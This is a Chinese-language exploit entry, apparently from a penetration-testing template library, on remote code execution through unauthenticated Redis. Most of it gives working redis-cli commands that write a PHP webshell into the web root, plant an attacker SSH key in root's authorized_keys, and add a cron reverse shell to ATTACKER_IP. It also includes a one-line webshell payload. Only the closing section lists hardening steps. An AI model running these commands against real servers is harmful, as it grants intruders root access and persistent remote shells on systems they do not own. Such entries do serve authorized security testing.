---
id: REDIS-UNAUTH-WRITE-RCE
title: "Redis - 未授权写文件RCE（Webshell/SSH密钥/Crontab）"
product: redis
vendor: Redis
version_affected: "all versions (misconfiguration)"
severity: CRITICAL
tags: [rce, 未授权, 写文件, webshell, ssh, crontab]
fingerprint: ["Redis"]
---

## 漏洞描述

Redis 在未授权访问或已知密码的情况下，可以利用 `CONFIG SET dir` 和 `CONFIG SET dbfilename` 修改数据持久化目录和文件名，将恶意内容写入任意路径。攻击者可以通过写入 Webshell、SSH 公钥、Crontab 反弹 shell 等方式实现远程代码执行。

## 影响版本

- 所有版本（配置不当：未设置密码或使用弱密码，且 CONFIG 命令未被禁用）

## 前置条件

- Redis 未授权访问或已知密码
- CONFIG 命令未被 rename-command 禁用
- 目标系统存在可写目录（web 目录、/root/.ssh/、/var/spool/cron/ 等）

## 利用步骤

### 方法一：写 Webshell

需要知道 web 目录路径，目标运行了 web 服务。

```bash
redis-cli -h TARGET

# 确认 web 目录（常见路径）
CONFIG SET dir /var/www/html/
# 备选: /usr/share/nginx/html/, /opt/lampp/htdocs/, /var/www/

CONFIG SET dbfilename cmd.php
SET pwn "<?php @eval($_POST['ant']); ?>"
SAVE

# 验证
curl http://TARGET/cmd.php -d "ant=system('id');"
```

### 方法二：写 SSH 公钥

需要目标运行 SSH 服务且 root 用户的 .ssh 目录存在或可创建。

```bash
# 先生成密钥对
ssh-keygen -t rsa -f /tmp/redis_rsa -N ""

# 构造 payload（前后加换行避免 Redis 格式字符污染）
(echo -e "\n\n"; cat /tmp/redis_rsa.pub; echo -e "\n\n") > /tmp/redis_key.txt

redis-cli -h TARGET
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET pwn "$(cat /tmp/redis_key.txt)"
SAVE
QUIT

# 连接
ssh -i /tmp/redis_rsa root@TARGET
```

### 方法三：写 Crontab 反弹 Shell

```bash
redis-cli -h TARGET

# CentOS/RHEL: /var/spool/cron/
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root

# Ubuntu/Debian: /var/spool/cron/crontabs/
# CONFIG SET dir /var/spool/cron/crontabs/
# CONFIG SET dbfilename root

SET pwn "\n\n* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\n\n"
SAVE
```

**注意**：Ubuntu 的 cron 要求文件权限严格（600 + 属主），Redis 写入的文件权限通常不对，所以 crontab 方式在 Ubuntu 下常失败。CentOS/RHEL 更宽容。

## Payload

```bash
# 简化版一行写 webshell
redis-cli -h TARGET -e "CONFIG SET dir /var/www/html/" "CONFIG SET dbfilename shell.php" "SET pwn '<?php system(\$_GET[\"cmd\"]); ?>'" "SAVE"
```

## 修复建议

1. 为 Redis 设置强密码（requirepass）
2. 使用 `rename-command CONFIG ""` 禁用 CONFIG 命令
3. 以低权限用户运行 Redis，避免使用 root
4. 绑定监听地址为 127.0.0.1，避免暴露在外网
5. 使用防火墙限制 6379 端口访问来源
